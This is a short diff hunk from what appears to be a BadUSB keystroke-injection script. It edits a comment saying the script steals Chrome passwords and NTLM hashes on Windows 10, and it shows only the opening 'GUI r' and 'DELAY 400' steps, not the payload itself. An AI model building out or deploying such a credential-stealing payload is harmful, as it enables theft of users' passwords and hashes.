@@ -1,4 +1,4 @@
-REM This script is written by @mr_qpr n @m3dsec to steal the passwords of Chrome n NTLM hash only against on win 10
+REM This script is written by @mr_qpr n @m3dsec to steal the passwords of Chrome n NTLM hash on win 10
 REM Tested on "Google Chrome 85.0.4183.121"
 GUI r
 DELAY 400
